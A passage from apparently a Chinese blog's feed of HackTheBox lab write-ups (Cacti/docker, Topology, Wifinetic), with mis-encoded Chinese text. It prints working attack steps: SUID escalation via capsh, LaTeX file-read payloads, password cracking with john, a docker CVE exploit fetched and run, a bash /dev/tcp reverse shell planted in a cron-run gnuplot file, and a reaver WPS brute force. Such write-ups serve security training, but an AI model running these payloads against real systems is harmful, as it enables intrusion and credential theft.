<p>åœ¨shellå‘½ä»¤ææƒæ‰‹å†Œé‡Œæ‰¾åˆ°ææƒç”¨æ³•å¦‚ä¸‹</p>
<p><a href="https://gtfobins.github.io/gtfobins/capsh/#suid">https://gtfobins.github.io/gtfobins/capsh/#suid</a></p>
<pre class="line-numbers language-none"><code class="language-none">/sbin/capsh --gid=0 --uid=0 --<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904161559695.png"></p>
<p>ææƒåˆ°äº†rootï¼Œä½†æ˜¯æ­¤rootéå½¼root</p>
<p>çœ‹åˆ°ä¸Šé¢æœ‰mysqlå‘½ä»¤ï¼Œè€Œä¸”adminå’Œguestç”¨æˆ·éƒ½åœ¨user_authè¡¨é‡Œï¼Œé‚£ä¹ˆæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904172320625.png"></p>
<p>å‘ç°æœ‰å¦ä¸€ä¸ªç”¨æˆ·marcusï¼Œå¯†ç æ˜¯hashå­˜å‚¨ï¼Œé‚£å°±ç”¨johnçˆ†ç ´ä¸€ä¸‹</p>
<p>å°†hashä¿å­˜åˆ°æ–°æ–‡ä»¶hashé‡Œï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¾—åˆ°å¯†ç </p>
<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904172709440.png"></p>
<pre class="line-numbers language-none"><code class="language-none">marcus:funkymonkey<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sshè¿æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904173047965.png"></p>
<p>ä»æœ¬åœ°ä¸‹è½½linpeas</p>
<p>æœ¬åœ°kaliæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›®æ ‡é¶æœºæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">cd /tmp
wget http://10.10.14.4/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°æœ‰é‚®ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904175615061.png"></p>
<p>æŸ¥çœ‹é‚®ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">cat /var/mail/marcus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904174620615.png"></p>
<h2 id="å››ã€CVE-2021-41091ï¼ˆdockerç›®å½•éå†-amp-å‘½ä»¤æ‰§è¡Œï¼‰"><a href="#å››ã€CVE-2021-41091ï¼ˆdockerç›®å½•éå†-amp-å‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="å››ã€CVE-2021-41091ï¼ˆdockerç›®å½•éå†&amp;å‘½ä»¤æ‰§è¡Œï¼‰"></a>å››ã€CVE-2021-41091ï¼ˆdockerç›®å½•éå†&amp;å‘½ä»¤æ‰§è¡Œï¼‰</h2><p>å¯çœ‹åˆ°æœ‰ä¸‰ä¸ªCVEï¼Œä¾æ¬¡googleæŸ¥æ‰¾åˆ©ç”¨æ–¹å¼ï¼Œæ‰¾åˆ°å¦‚ä¸‹exploitï¼Œæ˜¯dockerå®¹å™¨çš„æ¼æ´</p>
<p><a href="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p>
<p>å¤§è‡´åŸç†æ˜¯ï¼Œå› ä¸ºæƒé™æ§åˆ¶ä¸å½“ï¼Œå½“dockerå®¹å™¨å†…å­˜åœ¨å¸¦æœ‰suidçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»æœºéå†åˆ°è¿™ä¸ªdockerå®¹å™¨çš„ç›®å½•ï¼Œç„¶åæ‰§è¡Œè¿™äº›å¸¦suidçš„ç¨‹åºï¼Œç›¸å½“äºä¹Ÿåœ¨ä¸»æœºä¸­æ‰§è¡Œäº†è¿™äº›å¸¦suidçš„ç¨‹åº</p>
<p>éœ€è¦å…ˆåœ¨ä¹‹å‰çš„rootçª—å£ç»™<code>/bin/bash</code>æ·»åŠ suidæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904185713153.png"></p>
<p>ç„¶åå°†exploitä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶ååœ¨ç›®æ ‡é¶æœºä»æœ¬åœ°ä¸‹è½½exp.shï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.4/exp.sh
chmod +x exp.sh
./exp.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å†è¿›å…¥åˆ°å®¹å™¨ç›®å½•ï¼ˆåœ¨æ‰§è¡Œç»“æœçš„Current Vulnerable Pathå¤„ï¼‰ï¼Œæ‰§è¡Œ<code>./bin/bash -p</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904185837017.png"></p>
<p>æˆåŠŸè·å–rootæƒé™</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904185905491.png" style="zoom: 67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>mysqlæ•°æ®åº“</tag>
        <tag>CVE-2022-46169ï¼ˆCactiæ¡†æ¶å‘½ä»¤æ³¨å…¥ï¼‰</tag>
        <tag>CVE-2021-41091ï¼ˆdockerææƒï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Topology</title>
    <url>/posts/e1e0c79d.html</url>
    <content><![CDATA[<h1 id="HTB-Topology"><a href="#HTB-Topology" class="headerlink" title="HTB-Topology"></a>HTB-Topology</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†å‘ç°LaTeXå…¬å¼ç”Ÿæˆå™¨ï¼›</p>
<p>2.LaTeXå…¬å¼ç”Ÿæˆå™¨ä»»æ„æ–‡ä»¶è¯»å–Apacheçš„<code>.htpasswd</code>æ–‡ä»¶è·å–SSHè´¦æˆ·ï¼›</p>
<p>3.SSHè¿æ¥æ‰§è¡Œpspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shellè·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.11.217<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911154643078.png"></p>
<p>80ç«¯å£å¼€æ”¾ï¼Œç›´æ¥è®¿é—®</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911154746560.png" style="zoom: 67%;">

<p>é¦–é¡µçœ‹åˆ°æœ‰ä¸€ä¸ªLaTeXè¡¨è¾¾å¼çš„è¶…é“¾æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911161807906.png"></p>
<p>å‘ç°å­åŸŸï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.217 latex.topology.htb topology.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="ä¸‰ã€latexå®ç°ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä¸‰ã€latexå®ç°ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä¸‰ã€latexå®ç°ä»»æ„æ–‡ä»¶è¯»å–"></a>ä¸‰ã€latexå®ç°ä»»æ„æ–‡ä»¶è¯»å–</h2><p>googleå…³é”®è¯ï¼šlatex exploit</p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection</a></p>
<p>ç»è¿‡å°è¯•ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼Œè¯»å–<code>/etc/passwd</code>æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">$\lstinputlisting{/etc/passwd}$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911164845923.png" style="zoom: 80%;">

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911165033672.png" style="zoom:80%;">

<p>å‘ç°å¦ä¸€ä¸ªç”¨æˆ·<code>vdaisley</code>ï¼Œä½†æ˜¯æ²¡æœ‰å£ä»¤ï¼Œæ‰«æå­åŸŸå‘ç°<code>stats</code>å’Œ<code>dev</code>å­åŸŸï¼Œéƒ½æ·»åŠ åˆ°æœ¬åœ°hostsæ–‡ä»¶åï¼Œ<code>stats</code>å­åŸŸæ‰“å¼€æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œ<code>dev</code>å­åŸŸéœ€è¦è®¤è¯</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster vhost -u http://topology.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911163525918.png"></p>
<p>æ—¢ç„¶<code>dev</code>å­åŸŸéœ€è¦è®¤è¯ï¼Œè€Œä¸”é€šå¸¸åœ¨ApacheæœåŠ¡å™¨ä¸­ä¼šä½¿ç”¨<code>.htpasswd</code>æ–‡ä»¶å­˜å‚¨å¯†ç æ–‡ä»¶ï¼Œé‚£ä¹ˆ<code>vdaisley</code>çš„å£ä»¤ä¹Ÿææœ‰å¯èƒ½å­˜å‚¨åœ¨<code>dev</code>å­åŸŸçš„<code>.htpasswd</code>æ–‡ä»¶ä¸­ï¼Œåˆå› ä¸ºæ­¤æ–‡ä»¶é€šå¸¸ä½äºç½‘ç«™æ ¹ç›®å½•ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¦‚ä¸‹payloadå°è¯•è¯»å–<code>/var/www/dev/.htpasswd</code>æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">$\lstinputlisting{/var/www/dev/.htpasswd}$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911171201018.png"></p>
<pre class="line-numbers language-none"><code class="language-none">vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŠŠhashå€¼å†™å…¥æ–‡ä»¶hashï¼Œç”¨johnçˆ†ç ´</p>
<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911172715197.png"></p>
<pre class="line-numbers language-none"><code class="language-none">vdaisley:calculus20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SSHè¿æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911173302757.png"></p>
<h2 id="å››ã€pspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shell"><a href="#å››ã€pspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shell" class="headerlink" title="å››ã€pspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shell"></a>å››ã€pspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shell</h2><p>æœ¬åœ°kaliå¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›®æ ‡é¶æœºä»æœ¬åœ°ä¸‹è½½pspy64</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8/pspy64
chmod +x pspy64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œï¼Œå‘ç°å®šæ—¶ä»»åŠ¡å¦‚ä¸‹ï¼Œå¯é€šè¿‡åœ¨/opt/gnuplotç›®å½•ä¸‹æ–°å»ºåç¼€ä¸º<code>.plt</code>çš„æ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­å†™å…¥æ¶æ„å‘½ä»¤ï¼Œé€šè¿‡å®šæ—¶ä»»åŠ¡çš„<code>/bin/sh -c</code>é—´æ¥æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911180257966.png"></p>
<p>æ–°å»ºæ–‡ä»¶<code>/opt/gnuplot/shell.plt</code>ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">system "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/9898 0&gt;&amp;1'"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliå¼€å¯ç›‘å¬</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç¨ç­‰ç‰‡åˆ»ï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911181002456.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911181258210.png" style="zoom:67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LaTeXå…¬å¼</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Wifinetic</title>
    <url>/posts/e48c1386.html</url>
    <content><![CDATA[<h1 id="HTB-Wifinetic"><a href="#HTB-Wifinetic" class="headerlink" title="HTB-Wifinetic"></a>HTB-Wifinetic</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>ä¿¡æ¯æ³„éœ²ã€æ— çº¿ç½‘ç»œç›¸å…³çŸ¥è¯†</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922090938331.png" style="zoom:80%;">

<p>FTP</p>
<pre class="line-numbers language-none"><code class="language-none">ftp 10.10.11.247  #ä¼šæç¤ºThis FTP server is anonymous onlyï¼Œæ‰€ä»¥ç™»å½•anonymousç”¨æˆ·
promot	#å…³é—­äº¤äº’æ¨¡å¼ï¼Œä¸å…³çš„è¯ä¸‹è½½æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šè¯¢é—®
mget *	#ä¸‹è½½æ‰€æœ‰æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922095011089.png" style="zoom:80%;">

<p><code>MigrateOpenWrt.txt</code>æœ‰å¦‚ä¸‹å†…å®¹ï¼Œæç¤º<code>Reaver</code>å·¥å…·å¯ä»¥æµ‹è¯•å®‰å…¨é—®é¢˜ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çŸ¥é“æ˜¯Wifiç¯å¢ƒ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922112249162.png" style="zoom:80%;">

<p><code>ProjectGreatMigration.pdf</code>æœ‰é‚®ç®±å’ŒåŸŸå</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922112648529.png" style="zoom:80%;">

<p>è§£å‹tarå‹ç¼©åŒ…</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922135058358.png" style="zoom:80%;">

<p>åœ¨<code>./etc/config/wireless</code>æ‰¾åˆ°äº†ä¸€ä¸ªç–‘ä¼¼å£ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">VeRyUniUqWiFIPasswrd1!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922140018753.png" style="zoom:80%;">

<p>åœ¨<code>./etc/passwd</code>å‘ç°ä¸€ä¸ªéå¸¸è§„ç”¨æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922140123110.png"></p>
<p>å°è¯•è¿æ¥sshæœåŠ¡ï¼ŒæˆåŠŸè¿æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">ssh netadmin@10.10.11.247<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922140345956.png"></p>
<h2 id="ä¸‰ã€ææƒ"><a href="#ä¸‰ã€ææƒ" class="headerlink" title="ä¸‰ã€ææƒ"></a>ä¸‰ã€ææƒ</h2><p>æ— çº¿ç½‘ç»œï¼Œæœ€ä¸»è¦çš„å°±æ˜¯å¼„æ¸…æ¥šæ— çº¿APï¼ˆAccess Pointï¼‰æ˜¯è°</p>
<p>æ‰§è¡Œ<code>ifconfig</code>æŸ¥çœ‹<code>wlan0</code>å’Œ<code>wlan1</code>åˆ†é…äº†IPï¼Œå¸¸è§„APçš„IPä¸€èˆ¬éƒ½æ˜¯<code>192.168.1.1</code>ã€<code>192.168.0.1</code>ï¼Œæš‚ä¸”çŒœæµ‹<code>wlan0</code>æ˜¯AP</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162619994.png"></p>
<p>æŸ¥çœ‹<code>wpa_supplicant</code>æœåŠ¡çŠ¶æ€ï¼Œæœ€åä¸€è¡Œå‘½ä»¤å¯çœ‹å‡º<code>wlan1</code>æ˜¯wifiå®¢æˆ·ç«¯ï¼Œæ’é™¤æ³•åŸºæœ¬ç¡®å®š<code>wlan0</code>æ˜¯AP</p>
<blockquote>
<p><code>wpa_supplicant</code>æ˜¯wifiå®¢æˆ·ç«¯åŠ å¯†è®¤è¯å·¥å…·ï¼Œå’Œ<code>iwconfig</code>ä¸åŒï¼Œæ”¯æŒWEPã€WPAã€WPA2ç­‰å®Œæ•´çš„åŠ å¯†è®¤è¯ï¼Œè€Œ<code>iwconfig</code>åªèƒ½æ”¯æŒWEPè®¤è¯ï¼Œä¸å…¶ç›¸å¯¹åº”çš„APç«¯çš„åŠ å¯†è®¤è¯å·¥å…·ä¸º<code>hostapd</code></p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">systemctl status wpa_supplicant.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162713735.png"></p>
<blockquote>
<p>å‘½ä»¤è§£é‡Šï¼š</p>
<ol>
<li><code>/sbin/wpa_supplicant</code>: è¿™æ˜¯ <code>wpa_supplicant</code> å·¥å…·çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œå®ƒç”¨äºå¤„ç†æ— çº¿ç½‘ç»œè¿æ¥çš„è®¤è¯å’Œåå•†è¿‡ç¨‹ã€‚</li>
<li><code>-u</code>: ä»¥å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰çš„æ–¹å¼è¿è¡Œã€‚è¿™æ„å‘³ç€ <code>wpa_supplicant</code> å°†åœ¨åå°æŒç»­è¿è¡Œï¼Œè€Œä¸æ˜¯åœ¨ç»ˆç«¯çª—å£ä¸­æ˜¾ç¤ºè¾“å‡ºã€‚</li>
<li><code>-s</code>: ç”Ÿæˆç³»ç»Ÿæ—¥å¿—ï¼ˆsystem logï¼‰ä¿¡æ¯ï¼Œä»¥ä¾¿è·Ÿè¸ªå…¶æ“ä½œå’Œé—®é¢˜æ’æŸ¥ã€‚</li>
<li><code>-c /etc/wpa_supplicant.conf</code>: æŒ‡å®š <code>wpa_supplicant</code> ä½¿ç”¨çš„é…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé…ç½®æ–‡ä»¶ä½äº <code>/etc/wpa_supplicant.conf</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ä½ç½®ï¼Œç”¨äºå­˜å‚¨æ— çº¿ç½‘ç»œè¿æ¥çš„é…ç½®ä¿¡æ¯ã€‚è¯¥æ–‡ä»¶åŒ…å«äº†ç½‘ç»œçš„SSIDï¼ˆæ— çº¿ç½‘ç»œåç§°ï¼‰å’Œå¯†ç ç­‰ä¿¡æ¯ã€‚</li>
<li><code>-i wlan1</code>: æŒ‡å®šè¦ç”¨äºæ— çº¿è¿æ¥çš„ç½‘ç»œæ¥å£çš„åç§°ã€‚æ­¤å¤„ç½‘ç»œæ¥å£çš„åç§°æ˜¯ <code>wlan1</code>ï¼Œè¿™é€šå¸¸æ˜¯æ— çº¿ç½‘å¡çš„åç§°ã€‚</li>
</ol>
</blockquote>
<p>æŸ¥çœ‹<code>hostapd</code>æœåŠ¡çŠ¶æ€</p>
<pre class="line-numbers language-none"><code class="language-none">systemctl status hostapd.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162753397.png"></p>
<blockquote>
<p>å‘½ä»¤è§£é‡Šï¼š</p>
<ol>
<li><code>/usr/sbin/hostapd</code>: è¿™æ˜¯ <code>hostapd</code> å·¥å…·çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œç”¨äºå¯åŠ¨æ— çº¿æ¥å…¥ç‚¹æœåŠ¡ã€‚</li>
<li><code>-B</code>: ä»¥å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰çš„æ–¹å¼è¿è¡Œï¼Œè€Œä¸åœ¨ç»ˆç«¯çª—å£ä¸­æ˜¾ç¤ºè¾“å‡ºã€‚</li>
<li><code>-P /run/hostapd.pid</code>: æŒ‡å®š <code>hostapd</code> è¿›ç¨‹çš„ PIDï¼ˆProcess IDï¼‰æ–‡ä»¶çš„ä½ç½®ã€‚PID æ–‡ä»¶ç”¨äºå­˜å‚¨ <code>hostapd</code> è¿›ç¨‹çš„è¿›ç¨‹å·ï¼Œä»¥ä¾¿åç»­ç®¡ç†å’Œç›‘æ§ã€‚</li>
<li><code>/etc/hostapd/hostapd.conf</code>: æŒ‡å®š <code>hostapd</code> ä½¿ç”¨çš„é…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†æ— çº¿æ¥å…¥ç‚¹çš„é…ç½®ä¿¡æ¯ï¼Œå¦‚æ— çº¿ç½‘ç»œçš„åç§°ï¼ˆSSIDï¼‰ã€åŠ å¯†æ–¹å¼ã€å¯†ç ç­‰ã€‚</li>
</ol>
</blockquote>
<p>ç”¨<code>iwconfig</code>å‘½ä»¤æŸ¥çœ‹æ— çº¿ç½‘å¡é…ç½®ä¿¡æ¯</p>
<blockquote>
<p>iwconfig å‘½ä»¤ç±»ä¼¼äºifconfigå‘½ä»¤ï¼Œä½†æ˜¯å®ƒé…ç½®å¯¹è±¡æ˜¯æ— çº¿ç½‘å¡ï¼Œå®ƒå¯¹ç½‘ç»œè®¾å¤‡è¿›è¡Œæ— çº¿æ“ä½œï¼Œå¦‚è®¾ç½®æ— çº¿é€šä¿¡é¢‘æ®µç­‰ã€‚</p>
</blockquote>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162919258.png" style="zoom:80%;">

<p>å¯ä»¥çœ‹åˆ°ï¼š</p>
<p>mon0ç½‘å¡æ¨¡å¼æ˜¯Monitorï¼Œè¯´æ˜æ˜¯ç›‘æ§æ— çº¿ç½‘ç»œçŠ¶æ€çš„æ¥å£ï¼Œä¸€èˆ¬ç”¨äºè°ƒè¯•æˆ–è€…ç›‘æ§ã€‚</p>
<p>wlan1ç½‘å¡æ¨¡å¼æ˜¯Managedï¼Œè¯´æ˜æ˜¯è¢«ç®¡ç†å¯¹è±¡ï¼ˆå³å®¢æˆ·ç«¯ï¼‰ï¼Œè¿æ¥çš„APçš„ESSIDæ˜¯<code>OpenWrt</code>ï¼Œè¿˜å¯çœ‹åˆ°APçš„BSSIDï¼ˆMACåœ°å€ï¼‰ã€‚</p>
<p>wlan0ç½‘å¡æ¨¡å¼æ˜¯Masterï¼Œè¯´æ˜æ˜¯ç®¡ç†è€…ï¼ˆå³APï¼‰ã€‚</p>
<blockquote>
<p><strong>SSID</strong>å°±æ˜¯æ‰‹æœºä¸Šæœç´¢åˆ°çš„wifiåå­—ï¼ˆæœ¬è´¨æ˜¯<strong>ä¸€ä¸²å­—ç¬¦</strong>ï¼‰ã€‚</p>
<p><strong>BSSID</strong>å°±æ˜¯æ— çº¿è·¯ç”±å™¨çš„MACåœ°å€ï¼ˆæœ¬è´¨æ˜¯<strong>ä¸€ä¸ªMACåœ°å€</strong>ï¼‰ã€‚ä¸¾ä¾‹ï¼Œä¸€å®¶å…¬å¸é¢ç§¯æ¯”è¾ƒå¤§ï¼Œå®‰è£…äº†è‹¥å¹²å°æ— çº¿æ¥å…¥ç‚¹ï¼ˆAPæˆ–è€…æ— çº¿è·¯ç”±å™¨ï¼‰ï¼Œæ¯å°è®¾å¤‡çš„SSIDéƒ½ä¸€æ ·ï¼Œå‘˜å·¥åªéœ€è¦çŸ¥é“ä¸€ä¸ªSSIDå°±å¯ä»¥åœ¨æ— çº¿èŒƒå›´å†…æ¥å…¥æ— çº¿ç½‘ç»œã€‚<strong>BSSIDå…¶å®å°±æ˜¯æ¯å°è®¾å¤‡çš„MACåœ°å€</strong>ã€‚</p>
<p><strong>ESSID</strong>æ˜¯ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µã€‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¤šå°è®¾å¤‡ç›¸åŒçš„SSIDå°±ç»Ÿç§°ä¸ºESSIDã€‚</p>
</blockquote>
<p>ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ¯ä¸ªæ¥å£çš„é“¾è·¯çŠ¶æ€ä¿¡æ¯</p>
<pre class="line-numbers language-none"><code class="language-none">iw dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯çœ‹åˆ°wlan0çš„åœ°å€å’Œssidå’Œä¸Šé¢åˆ†æçš„å®Œå…¨å¯¹åº”ï¼Œtypeå€¼ä¹Ÿæ˜¯AP</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163041825.png" style="zoom:80%;">

<p>ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ç¨‹åºæ–‡ä»¶çš„capabilitieså±æ€§</p>
<pre class="line-numbers language-none"><code class="language-none">getcap -r / 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>getcapå‘½ä»¤å’ŒLinux capabilitiesï¼š<a href="https://www.cnblogs.com/sparkdev/p/11417781.html">https://www.cnblogs.com/sparkdev/p/11417781.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163139780.png"></p>
<p>ç”¨washå·¥å…·æ‰«æwlan1å’Œwlan2ï¼Œçœ‹æ˜¯å¦å¯ç”¨äº†WPSè®¤è¯ï¼Œå‘ç°éƒ½æ²¡æœ‰ç»“æœ</p>
<pre class="line-numbers language-none"><code class="language-none">wash -i wlan2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163219038.png"></p>
<p>ç”¨reaverå·¥å…·ç ´è§£ç½‘ç»œWPS PIN</p>
<pre class="line-numbers language-none"><code class="language-none">reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<ol>
